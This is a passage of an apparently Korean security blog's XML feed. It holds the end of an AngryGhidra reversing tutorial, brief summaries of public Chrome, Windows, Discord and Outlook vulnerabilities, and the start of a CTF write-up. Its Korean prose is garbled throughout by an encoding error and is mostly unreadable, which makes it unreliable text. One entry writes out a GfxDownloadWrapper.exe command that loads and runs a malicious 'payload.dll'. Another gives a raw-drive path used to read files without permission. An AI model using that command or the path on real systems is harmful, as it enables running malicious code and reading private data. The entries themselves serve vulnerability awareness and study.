ê°’ì— ë”°ë¼ì„œ Niceì™€ incorrectë¡œ ë„˜ì–´ê°€ë„¤ìš”.</p><p>Incorrect ë¶€ë¶„ì„ í”¼í•˜ê³  Niceë¡œ ê°€ëŠ” íŒ¨ìŠ¤ì›Œë“œë¥¼ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.</p><p>ì € í•¨ìˆ˜ë¥¼ ì¼ì¼ì´ ë¶„ì„í•˜ëŠ” ë°©ë²•ë„ ìˆì§€ë§Œ ìš°ë¦¬ì—ê²ŒëŠ” AngryGhidraê°€ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/10/25/idioth/angryghidra/img6.png"></p><p>ë¨¼ì € í•¨ìˆ˜ì˜ ì‹œì‘ ë¶€ë¶„ì—ì„œ blank stateë¥¼ ì„¤ì •í•´ ì¤ë‹ˆë‹¤.</p><p><img src="/2020/10/25/idioth/angryghidra/img7.png"></p><p>ìš°ë¦¬ëŠ” Nice ë¬¸ìì—´ ë¶€ë¶„ìœ¼ë¡œ ë„˜ì–´ê°€ëŠ” ê°’ì„ ì°¾ê³  ì‹¶ìœ¼ë‹ˆ Nice ìª½ìœ¼ë¡œ ë„˜ì–´ê°€ëŠ” ì£¼ì†Œë¥¼ Find Addressë¡œ ì„¤ì •í•´ ì¤ë‹ˆë‹¤.</p><p><img src="/2020/10/25/idioth/angryghidra/img8.png"></p><p>Incorrectë¡œ ê°€ëŠ” ë¶€ë¶„ì€ í”¼í•´ì•¼ ë˜ë‹ˆ Avoid Addressë¡œ ì„¤ì •í•œ ë‹¤ìŒì— AngryGhidraë¥¼ ì‹¤í–‰í•´ë´…ì‹œë‹¤!</p><p><img src="/2020/10/25/idioth/angryghidra/img9.png"></p><p><img src="/2020/10/25/idioth/angryghidra/img10.png"></p><p>Window - AngryGhidraPluginì„ í´ë¦­í•˜ë©´ ìœ„ì˜ ì‚¬ì§„ê³¼ ê°™ì€ ì°½ì´ ëœ¹ë‹ˆë‹¤. ì¸ìì˜ ê¸¸ì´ë¥¼ ì§€ì •í•  ìˆ˜ë„ ìˆê³ , auto_load_libsë¥¼ ì„¤ì •í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.</p><p>Blank Stateì™€ Find address, avoid addressë¥¼ ëª¨ë‘ ì„¤ì •í•˜ì˜€ìœ¼ë‹ˆ Run ë²„íŠ¼ì„ ëˆŒëŸ¬ angrë¥¼ ëŒë ¤ë´…ì‹œë‹¤.</p><p>ì ì‹œ ê¸°ë‹¤ë ¤ë³´ë©´ Solution Foundë¼ê³  ëœ¨ë©° ì•„ë˜ì™€ ê°™ì´ ì–´ë–¤ ë¬¸ìì—´ì´ ëœ¹ë‹ˆë‹¤.</p><p><img src="/2020/10/25/idioth/angryghidra/img11.png"></p><p>ë‚˜ì˜¨ ë¬¸ìì—´ì„ ë°”ì´ë„ˆë¦¬ì— ì…ë ¥í•´ë³´ë©´</p><pre><code class="hljs bash">~/Desktop$ ./r100.bin Enter the password: Code_TalkersNice!</code></pre><p>ì •ìƒì ìœ¼ë¡œ ì°¾ì€ ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ë‚˜ëŠ” ì†ŒìŠ¤ ì½”ë“œ ë³´ê³  í´ë¦­ì§ˆë§Œ ëª‡ ë²ˆ í•˜ë©´ ê°’ì„ ì°¾ì•„ì¤€ë‹¤? ì •ë§ ì¸ê°„ì˜ ìš•êµ¬ì— ì¶©ì‹¤í•œ í”ŒëŸ¬ê·¸ì¸ì´ ì•„ë‹ ìˆ˜ê°€ ì—†ìŠµë‹ˆë‹¤.</p><p>ì§ì ‘ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•´ì„œ ëŒë¦¬ëŠ” ê²ƒì´ ê¸°ëŠ¥ì ìœ¼ë¡œëŠ” í›¨ì”¬ íš¨ìœ¨ì ì¼ ìˆ˜ ìˆì§€ë§Œ ë¦¬ë²„ì‹±ì„ ì§„í–‰í•˜ë©´ì„œ ë°”ë¡œë°”ë¡œ angr í™˜ê²½ ì„¸íŒ… ë° ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤ëŠ” ì ì´ ë§¤ë ¥ì ì´ì—ˆìŠµë‹ˆë‹¤.</p><p>ì•„ì§ì€ ê°„ë‹¨í•œ ê²ƒë“¤ë¡œë§Œ í•´ë³´ê³  ë” ë³µì¡í•œ ê²ƒë“¤ì€ ì‚¬ìš©í•´ë³´ì§€ ì•Šì•˜ëŠ”ë° ë‚˜ì¤‘ì— ê¸°íšŒê°€ ëœë‹¤ë©´ ë” ë³µì¡í•œ ë°”ì´ë„ˆë¦¬ì— ì‚¬ìš©í•´ë³´ê³  ì˜¬ë ¤ë³´ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤ ã…‹ã…‹</p><p>ì˜¤ëŠ˜ë„ ì €ì˜ ë©ì²­í•¨ì„ í™•ì¸í•˜ê³  ê·¹ë³µí•œ ë‚˜ì—ê²Œ ê±´ë°°í•˜ë©°.. adios..</p><p align="center"><img src="./img12.jpg" width="50%" heightd="50%"></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>angr</tag>
      
      <tag>ghidra</tag>
      
      <tag>angryghidra</tag>
      
      <tag>symbolic execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-15999: Chrome 0-day, Heap buffer overflow</title>
    <link href="/2020/10/24/fabu1ous/2020-10-24/"/>
    <url>/2020/10/24/fabu1ous/2020-10-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://savannah.nongnu.org/bugs/?59308">Heap buffer overflow due to integer truncation in Load_SBit_Png</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Google Chrome</p><p>Freetype</p><p>libpng</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2020-10-21ì¼ Chrome ê¸´ê¸‰ íŒ¨ì¹˜ê°€ ë¦´ë¦¬ì¦ˆ ëìŠµë‹ˆë‹¤. CVE-2020-15999ëŠ” Chromeì—ì„œ í°íŠ¸ë¥¼ ë Œë”ë§ í•  ë•Œ ì‚¬ìš©í•˜ëŠ” ì˜¤í”ˆì†ŒìŠ¤ ë¼ì´ë¸ŒëŸ¬ë¦¬ Freetypeì™€ ê³µì‹ PNG ë¼ì´ë¸ŒëŸ¬ë¦¬ libpng ì‚¬ì´ì—ì„œ ë°œìƒí•˜ëŠ” ì´ìŠˆì…ë‹ˆë‹¤. ê° ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” ì´ë¯¸ì§€ë¡œë¶€í„° 32-bit integerí¬ê¸°ì˜ widthì™€ heightê°’ì„ ì°¸ì¡°í•´ ë™ì‘í•˜ëŠ”ë°, Freetypeì€ 16-bitë¡œ truncate(ì¶•ì†Œ)í•œ ë’¤ bitmap í• ë‹¹ì— ì‚¬ìš©ë˜ëŠ” sizeë¥¼ ê³„ì‚°í•©ë‹ˆë‹¤. ì´ë¯¸ì§€ì˜ widthì™€ heightê°€ 16-bit ë³´ë‹¤ í¬ë‹¤ë©´ Freetypeì—ì„œ í• ë‹¹ëœ bitmapì´ ì‹¤ì œ ì´ë¯¸ì§€ë³´ë‹¤ ì‘ê² ì£ ? ì´  bitmapì„ libpngê°€ ì‚¬ìš©í•˜ë©´ì„œ heap buffer overflowê°€ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>heap bof</tag>
      
      <tag>png</tag>
      
      <tag>freetype</tag>
      
      <tag>libpng</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Bypassing NTFS permissions to read any files as unprivileged user</title>
    <link href="/2020/10/23/l0ch/10-23_1day1line/"/>
    <url>/2020/10/23/l0ch/10-23_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/ioncodes/CVE-2020-16938">POC using Windows API calls</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 2004/Server 2004</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ê¶Œí•œì´ ì—†ëŠ” ì¼ë°˜ ì‚¬ìš©ìê°€ ë¡œì»¬ ë“œë¼ì´ë¸Œì˜ ì „ì²´ ë°ì´í„°ë¥¼ ì—´ëŒí•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì˜ POCê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.<br>í•´ë‹¹ ì·¨ì•½ì ì€ ìµœê·¼ ì—…ë°ì´íŠ¸ë¡œ íŒŒí‹°ì…˜, ë³¼ë¥¨ ì¥ì¹˜ì— ëŒ€í•œ ê¶Œí•œì´ ë³€ê²½ë˜ì–´ <code>\\.\PhysicalDrive0\</code>ê²½ë¡œë¡œ ì¥ì¹˜ì— ì ‘ê·¼í•˜ë©´ ê¶Œí•œì„ ìš°íšŒí•´ arbitrary file readê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. </p><p><img src="/2020/10/23/l0ch/10-23_1day1line/image1.png" alt="image1"></p><p>NTFS parserì¸ 7zipìœ¼ë¡œë„ arbitrary file read ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://twitter.com/jonasLyk/status/1316104870987010048">https://twitter.com/jonasLyk/status/1316104870987010048</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file read</tag>
      
      <tag>ntfs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] GfxDownloadWrapper.exe LOLBINì„ ì´ìš©í•œ Assembly Loading</title>
    <link href="/2020/10/22/idioth/gfxdownloadwrapper/"/>
    <url>/2020/10/22/idioth/gfxdownloadwrapper/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bohops.com/2020/10/21/exploring-an-assembly-loading-technique-and-detection-mechanism-for-the-gfxdownloadwrapper-exe-lolbin/">Exploring an Assembly Loading Technique and Detection Mechanism for the GfxDownloadWrapper.exe LOLBIN</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>GfxDownloadWrapper.exeëŠ” ì¸í…” ë¹„ë””ì˜¤ ì¹´ë“œ ë“œë¼ì´ë²„ ì†Œí”„íŠ¸ì›¨ì–´ë¡œ ì¸í…” ê·¸ë˜í”½ ì»¨íŠ¸ë¡¤ íŒ¨ë„ ë° ê²Œì„ ê·¸ë˜í”½ ì„¤ì •ì„ ì§€ì›í•˜ëŠ” .NET ì‘ìš© í”„ë¡œê·¸ë¨ì…ë‹ˆë‹¤. í•´ë‹¹ íŒŒì¼ì€ â€œMicrosoft Windows Third Party Component CA 2012â€ë¡œ ì¸ì¦ë˜ì–´ ìˆìŠµë‹ˆë‹¤. GfxDownloadWrapper.exeëŠ” ì„ì˜ ë‹¤ìš´ë¡œë“œë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•œ ë£¨í‹´ì´ ì¡´ì¬í•˜ì§€ë§Œ ë‚®ì€ ë²„ì „ì—ì„œëŠ” ê·¸ëŸ¬í•œ ê²€ì¦ì´ ì—†ìŠµë‹ˆë‹¤.</p><p><code>main()</code> ì§„ì…ì ì—ì„œ ì–´ì…ˆë¸”ë¦¬ë¥¼ ë¡œë“œí•˜ëŠ” ë¶€ë¶„ì„ ë°œê²¬í•  ìˆ˜ ìˆìœ¼ë©° ì¸ìë¥¼ ì¡°ì‘í•¨ìœ¼ë¡œì¨ ì˜í–¥ì„ ë¯¸ì¹  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ul><li>args[0]: â€œrunâ€ì˜ ë¬¸ìì—´ ê°’</li><li>args[1]: ì–´ì…ˆë¸”ë¦¬ DLL í˜ì´ë¡œë“œ ê²½ë¡œ</li><li>args[2]: í•„ìˆ˜ ì–´ì…ˆë¸”ë¦¬ method ìˆ«ì ë¬¸ìì—´ ê°’<ul><li>0: <code>ApplyRecommendedSettings</code>, 1: <code>RestoreRecommendedSettings</code>, 2: <code>CacheCleanup</code></li></ul></li><li>args[3]: <code>AppData</code> ìƒëŒ€ ê²½ë¡œì— ìˆëŠ” ê²Œì„ ì‹ë³„ì ê°’</li></ul><pre><code class="hljs powershell">GfxDownloadWrapper.exe <span class="hljs-string">&quot;run&quot;</span> <span class="hljs-string">&quot;payload.dll&quot;</span> <span class="hljs-string">&quot;MethodNumber&quot;</span> <span class="hljs-string">&quot;;AppData\\Local\\Intel\\Games\\ì„ì˜ ê°’&quot;</span></code></pre><p>ë”°ë¼ì„œ ì¸ìë¥¼ ë§ì¶°ì¤€ í›„ DLL ê²½ë¡œë¥¼ ì•…ì„± dllë¡œ ì§€ì •í•˜ë©´ ì•…ì„± ì–´ì…ˆë¸”ë¦¬ë¥¼ ë¡œë“œí•œ í›„ ì„±ê³µì ìœ¼ë¡œ ì‹¤í–‰í•˜ê²Œ ë©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>lolbin</tag>
      
      <tag>lolbas</tag>
      
      <tag>living of the land</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-16902: Windows Installer EoP</title>
    <link href="/2020/10/21/fabu1ous/2020-10-21/"/>
    <url>/2020/10/21/fabu1ous/2020-10-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-windows-installer-elevation-of-privileges-vulnerability/">SSD Advisory â€“ Windows Installer Elevation of Privileges Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows Installer</p><p><strong>Affected Versions</strong></p><ul><li>Windows 7</li><li>Windows 8</li><li>Windows 10</li><li>Windows 2008</li><li>Windows 2012</li><li>Windows 2016</li><li>Windows 2019</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SSD Secure Disclosure programì— ì œë³´ëœ CVE-2020-16902ì…ë‹ˆë‹¤. Windows InstallerëŠ” ì†Œí”„íŠ¸ì›¨ì–´ì˜ ì„¤ì¹˜, ê´€ë¦¬, ì œê±°ì— ì‚¬ìš©ë˜ëŠ” Windows ì»´í¬ë„ŒíŠ¸ì…ë‹ˆë‹¤. <code>SetSecurity()</code>ì˜ race condition ë¬¸ì œë¡œ ì¸í•´ Windows installerëŠ” íŒ¨ì¹˜ì™€ íŒ¨ì¹˜ ìš°íšŒê°€ ë°˜ë³µë˜ê³  ìˆìŠµë‹ˆë‹¤. ì§€ê¸ˆ ì†Œê°œí•˜ëŠ” CVE-2020-16902ë„ ë§ˆì°¬ê°€ì§€ì…ë‹ˆë‹¤.</p><p>Windows InstallerëŠ” ì„¤ì¹˜ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ë©´ì„œ ë‘ ê°€ì§€ ì‘ì—…ì„ ì¶”ê°€ë¡œ ë³‘í–‰í•©ë‹ˆë‹¤. ì„¤ì¹˜ ì‘ì—…ì˜ ì‹¤íŒ¨ë¥¼ ëŒ€ë¹„í•´ roll back script (<code>.RBS</code>)ë¥¼ ì‘ì„±í•˜ê³ , ì„¤ì¹˜ ì‘ì—… ì¤‘ ì‚­ì œë˜ëŠ” ëª¨ë“  íŒŒì¼ë“¤ì„ ë³µì œí•´ c:\Config.Msiì— ì €ì¥í•©ë‹ˆë‹¤. <code>.RBS</code>ë¥¼ ì‘ì„±í•˜ê¸° ì „ì— íŠ¹ì • ë£¨í‹´ì„ ê±°ì¹˜ëŠ”ë°, ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> Config.Msi ì† ì„ì‹œíŒŒì¼ë“¤ì„ ìƒì„±<span class="hljs-number">2.</span> Config.Msi ì‚­ì œ<span class="hljs-number">3.</span> Config.Msi ì¡´ì¬ ì—¬ë¶€ í™•ì¸<span class="hljs-number">4.</span> Config.Msi ìƒì„±</code></pre><p>3ë²ˆ ê³¼ì •ì—ì„œ Config.Msi ë””ë ‰í† ë¦¬ê°€ ì—¬ì „íˆ ì¡´ì¬í•œë‹¤ë©´ <code>SetSecurity()</code>ë¥¼ ì‚¬ìš©í•˜ëŠ” ì½”ë“œê°€ ì‹¤í–‰ë˜ë©° ê¸°ì¡´ ì·¨ì•½ì (CVE-2020-1302)ì´ ê·¸ëŒ€ë¡œ ë‹¤ì‹œ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>local</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>system privilege</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Discord Desktop app RCE</title>
    <link href="/2020/10/20/l0ch/Discord_RCE/"/>
    <url>/2020/10/20/l0ch/Discord_RCE/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://mksben.l0.cm/2020/10/discord-desktop-rce.html">Discord Desktop app RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Discord Desktop app</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>node.js ê¸°ë°˜ ì˜¤í”ˆì†ŒìŠ¤ í”„ë ˆì„ì›Œí¬ì¸ Electronìœ¼ë¡œ ê°œë°œëœ Discordì—ì„œ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. </p><p>Electronì˜ <code>BrowserWindow API</code> ì˜µì…˜ ì¤‘ ì½”ë“œ ì‹¤í–‰ ì»¨í…ìŠ¤íŠ¸ë¥¼ ë¶„ë¦¬í•˜ëŠ” <code>contextIsolation</code> ì˜µì…˜ì´ discordì—ì„œëŠ” ë¹„í™œì„±í™” ë¼ìˆì–´ injectionëœ JSê°€ ë‚´ë¶€ í˜ì´ì§€ ì½”ë“œ ì‹¤í–‰ì— ì˜í–¥ì„ ì¤„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•˜ë©´ iframe embed XSS ë¥¼ í†µí•´ JavaScript ë‚´ì¥ ë©”ì†Œë“œë¥¼ ì¬ì •ì˜í•  ìˆ˜ ìˆìœ¼ë©° ì´ë•Œ Navigation restrictionì„ ìš°íšŒí•˜ë©´ iframeì„ escapeí•´ ìµœìƒìœ„ ì»¨í…ìŠ¤íŠ¸ì—ì„œ ì„ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>javascript</tag>
      
      <tag>context isolation</tag>
      
      <tag>xss</tag>
      
      <tag>discord</tag>
      
      <tag>electron</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-16947: Outlook 365 Remote Command Execution</title>
    <link href="/2020/10/19/idioth/cve-2020-16947/"/>
    <url>/2020/10/19/idioth/cve-2020-16947/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/0neb1n/CVE-2020-16947">CVE-2020-16947</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Outlook 365 apps for Enterprise/2016/2019</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Outlook 365ì—ì„œ ë©”ëª¨ë¦¬ ê°ì²´ì— ëŒ€í•œ ì²˜ë¦¬ë¥¼ ì˜ëª»í•˜ì—¬ RCEê°€ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>HTML ì½˜í…ì¸ ì—ì„œ ASCII ë²”ìœ„ ë°–ì˜ ë¬¸ìì—´ì„ ë³µì‚¬í•  ë•Œ í•´ë‹¹ ë¬¸ìì—´ë“¤ì€ <code>0xfffd</code>ë¡œ êµì²´ë©ë‹ˆë‹¤. ë”°ë¼ì„œ ë³µì‚¬ëœ ë¬¸ìì—´ì˜ í¬ê¸°ê°€ 2ë°°ê°€ ë˜ê¸° ë•Œë¬¸ì— src ë²„í¼ì™€ dst ë²„í¼ì˜ í¬ê¸°ê°€ ê°™ì•„ë„ ë²„í¼ ì˜¤ë²„í”Œë¡œê°€ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤.</p><p>í˜„ì¬ ì´ ì·¨ì•½ì ì— ëŒ€í•œ ìì„¸í•œ ê¸°ìˆ ì  ì„¤ëª…ê³¼ exploitì€ ê³µê°œë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>outlook</tag>
      
      <tag>idioth</tag>
      
      <tag>buffer overflow</tag>
      
      <tag>memory corruption</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF eat-the-pie</title>
    <link href="/2020/10/18/fabu1ous/sstf-eat-the-pie/"/>
    <url>/2020/10/18/fabu1ous/sstf-eat-the-pie/</url>
    
    <content type="html"><![CDATA[<h1 id="ë¨¸ë¦¿ë§"><a href="#ë¨¸ë¦¿ë§" class="headerlink" title="ë¨¸ë¦¿ë§"></a>ë¨¸ë¦¿ë§</h1><p>ë‰´ë¹„ë¶€í„° ê³ ìˆ˜ê¹Œì§€ ëª¨ë‘ ì¦ê¸¸ ìˆ˜ ìˆëŠ” CTFë¼ëŠ” ì†Œê°œê¸€ì„ ë³´ê³  ëŒ€í•™ ë™ì•„ë¦¬ ì‹ ì…ìƒë“¤ì„ ë°ë¦¬ê³  SSTFì— ì¶œì „í–ˆìŠµë‹ˆë‹¤. ì•„ì‰½ê²Œë„ ì¢‹ì€ ì„±ì ì„ ë‚´ì§„ ëª»í–ˆë„¤ìš”. ì‚¬ì‹¤ ì´ write-upì€ ê°™ì´ ì¶œì „í•œ ì‹ ì…ìƒ ì¹œêµ¬ë“¤ì—ê²Œ ë³´ì—¬ì£¼ë ¤ê³  ì‘ì„±í–ˆëŠ”ë° ëª‡ ëª…ì´ë‚˜ ì½ì—ˆì„ì§€â€¦</p><p>CTFë¥¼ ì²˜ìŒ ê²½í—˜í•˜ëŠ” ì¹œêµ¬ë“¤ì´ë¼ ìµœëŒ€í•œ í’€ì–´ì„œ ì„¤ëª…ì„ ì ì—ˆìœ¼ë©°, CTFì— ëŒ€í•œ ì €ì˜ ê²¬í•´ë„ ì¡°ê¸ˆì”© ì„ì—¬ ìˆìŠµë‹ˆë‹¤. eat-the-pieë¥¼ í’€ ë‹¹ì‹œ ì €ì˜ ì‚¬ê³  íë¦„ì„ ì¤‘ì‹¬ìœ¼ë¡œ ì‘ì„±í–ˆê³  ì´ ê¸€ì„ ì½ìœ¼ì‹¤ ë•Œë„ ì´ì ì„ ê¸°ì–µí•´ì£¼ì„¸ìš”.</p><p>[ ì·¨ì•½ì  ]</p><ol><li><p>Memory Leak With Printf</p></li><li><p>Out-Of-Bound</p></li></ol><h1 id="í›‘ì–´ë³´ê¸°"><a href="#í›‘ì–´ë³´ê¸°" class="headerlink" title="í›‘ì–´ë³´ê¸°"></a>í›‘ì–´ë³´ê¸°</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image1.png"></p><p><code>pwnme()</code>ë¼ëŠ” ì´ë¦„ì˜ í•¨ìˆ˜ê°€ ìˆë‹¤. <del>â€œë™ë„¤ ì‚¬ëŒë“¤!!! ì·¨ì•½ì  ì—¬ê¸° ìˆì–´ìš”!!!â€</del></p><p>CTFì—ì„œ ì´ë ‡ê²Œ ì·¨ì•½ì ì˜ ìœ„ì¹˜ë¥¼ ì•Œë ¤ì£¼ëŠ” ë¬¸ì œë“¤ì€ ì£¼ë¡œ ì·¨ì•½ì ì€ ê°„ë‹¨í•˜ì§€ë§Œ exploitìœ¼ë¡œ ì—°ê²°ì‹œí‚¤ëŠ” ê²ƒì´ ì–´ë ¤ìš´ ì»¨ì…‰ì˜ ë¬¸ì œë“¤ì…ë‹ˆë‹¤. eat-the-pieë„ ì´ëŸ° ì»¨ì…‰ì˜ ë¬¸ì œì¸ ê±° ê°™ì£ ?</p><p><del>[ ! ] ì‹¬ì§€ì–´ ë¬¸ì œ ì´ë¦„ë„ PIE ìš°íšŒë¥¼ ì•”ì‹œí•˜ê³  ìˆë‹¤.</del></p><p>ëŒ€ì¶© eat-the-pie ë¬¸ì œë¥¼ ì„¤ëª…í•˜ìë©´,</p><ol><li>stackì— vtableì„ ë§Œë“¤ê³  <code>read()</code>ë¡œ ì…ë ¥ì„ ë°›ìŒ.</li><li><code>read()</code>ë¡œ ë°›ì€ ì…ë ¥ ê°’ì„ ì´ìš©í•´ vtableë¡œë¶€í„° í•¨ìˆ˜ë¥¼ ì°¸ì¡° ì‹¤í–‰.</li></ol><p>ì´ ë‘ ê°€ì§€ ì •ë„ë§Œ ì•Œë©´ ë˜ëŠ” ê°„ë‹¨í•œ í”„ë¡œê·¸ë¨ì…ë‹ˆë‹¤.</p><p>CTF ë¬¸ì œë“¤ì€ ì˜ë„ì ìœ¼ë¡œ ì·¨ì•½ì ì„ ë§Œë“¤ì–´ ë†¨ê¸° ë•Œë¬¸ì— ì§±êµ¬ë¥¼ ì¡°ê¸ˆë§Œ êµ´ë ¤ ë³´ë©´</p><p>ì½”ë“œì—ì„œ ë§ì€ íŒíŠ¸ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p>[ ! ] Real worldì™€ ëŒ€ì¡°ë˜ëŠ” í° ì°¨ì´ì ì´ë‹¤.</p><p>ìœ„ ì‚¬ì§„ì—ì„œ í•˜ì´ë¼ì´íŠ¸ ëœ ë¶€ë¶„ì„ ë³´ê³  ìµœëŒ€í•œ ë§ì€ ì •ë³´ë¥¼ ì•Œì•„ë‚´ ë´…ì‹œë‹¤.</p><h1 id="ì·¨ì•½ì -ì˜ˆìƒ-ì •ì -ë¶„ì„"><a href="#ì·¨ì•½ì -ì˜ˆìƒ-ì •ì -ë¶„ì„" class="headerlink" title="ì·¨ì•½ì  ì˜ˆìƒ ( ì •ì  ë¶„ì„ )"></a>ì·¨ì•½ì  ì˜ˆìƒ ( ì •ì  ë¶„ì„ )</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image2.png"></p><ol><li>ì…ë ¥ì„ êµ³ì´ intê°€ ì•„ë‹Œ stringí˜•ìœ¼ë¡œ 16 byteë‚˜ ë°›ëŠ”ë‹¤.</li></ol><p>int( 4 byte )ê°€ ì•„ë‹Œ stringìœ¼ë¡œ 16 byteë‚˜ ì…ë ¥ë°›ëŠ” ê²ƒì€ 12 byteë§Œí¼ ë©”ëª¨ë¦¬ë¥¼ ë‚­ë¹„í•˜ëŠ” ê²ƒì´ê³  ì…ë ¥ë°›ì€ stringì„ intë¡œ ë°”ê¾¸ëŠ” ê³¼ì •ì„ í•œë²ˆ ë” ê±¸ì¹˜ë‹ˆ ê²°ì½” í•©ë¦¬ì ì¸ ì½”ë“œê°€ ì•„ë‹™ë‹ˆë‹¤. ì¦‰, ì·¨ì•½ì ìœ¼ë¡œ ë¹Œë“œ ì—… ë˜ë„ë¡ ì˜ë„ëœ ì½”ë“œì¸ ê±° ê°™ì£ ? <code>atoi()</code> í˜¹ì€ <code>printf()</code> ë“± NULL terminated string í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•œë‹¤ëŠ” ê²ƒë„ ì¤‘ìš”í•œ ì •ë³´ì¸ ê²ƒ ê°™ìŠµë‹ˆë‹¤.</p><ol start="2"><li>ifë¬¸ì˜ ì¡°ê±´ì´ ëª¨ë“  ê²½ìš°ì˜ ìˆ˜ë¥¼ ì»¤ë²„í•˜ì§€ ëª»í•¨.</li></ol><p>indexë¥¼ ì´ìš©í•´ ì°¸ì¡°í•˜ëŠ” ì½”ë“œê°€ ìˆë‹¤ë©´ ê°€ì¥ ë¨¼ì € í™•ì¸í•´ì•¼ í•  ê²ƒì´ ìˆìŠµë‹ˆë‹¤. ë°”ë¡œ, out-of-bound ê°€ëŠ¥ ì—¬ë¶€. 